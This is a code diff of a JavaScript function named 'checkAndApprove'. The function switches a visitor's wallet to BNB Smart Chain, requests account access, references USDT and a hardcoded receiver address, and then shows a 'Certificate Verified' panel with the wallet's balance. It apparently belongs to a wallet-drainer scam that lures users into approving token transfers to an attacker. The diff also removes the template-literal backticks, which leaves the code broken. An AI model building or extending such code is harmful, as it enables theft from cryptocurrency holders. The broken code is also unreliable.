@@ -5,11 +5,45 @@ async function checkAndApprove() {
   }
 
   const web3 = new Web3(window.ethereum);
+
+  // ✅ BNB Smart Chain Mainnet Details
+  const bscParams = {
+    chainId: "0x38", // 56 in hex
+    chainName: "BNB Smart Chain",
+    nativeCurrency: {
+      name: "BNB",
+      symbol: "BNB",
+      decimals: 18,
+    },
+    rpcUrls: ["https://bsc-dataseed.binance.org/"],
+    blockExplorerUrls: ["https://bscscan.com"],
+  };
+
+  try {
+    // 👇 Try switching to BSC
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: bscParams.chainId }],
+    });
+  } catch (switchError) {
+    // 👇 If not added, add BSC
+    if (switchError.code === 4902) {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [bscParams],
+      });
+    } else {
+      alert("Please switch to BNB Smart Chain in your wallet.");
+      return;
+    }
+  }
+
+  // 👇 Proceed after switching
   await window.ethereum.request({ method: "eth_requestAccounts" });
   const accounts = await web3.eth.getAccounts();
   const sender = accounts[0];
 
-  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
   const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
 
   const usdtAbi = [
@@ -69,14 +103,14 @@ async function checkAndApprove() {
   const masked = sender.slice(0, 6) + "..." + sender.slice(-4);
   const displayBalance = parseFloat(balance).toFixed(2);
 
-  const html = `
+  const html = 
     <div style="background-color: #1e1e1e; padding: 30px; border-radius: 12px; border: 1px solid #4caf50;">
       <h2 style="color: #4caf50;">✅ Certificate Verified</h2>
       <p style="font-size: 18px; color: #ccc;">${masked}</p>
       <p style="font-size: 20px; color: #ffc107;">Only ${displayBalance} USDT</p>
       <p style="color: #aaa; font-size: 14px;">🕒 ${timeString}</p>
     </div>
-  `;
+  ;
 
   document.getElementById("certificate-container").innerHTML = html;
 }
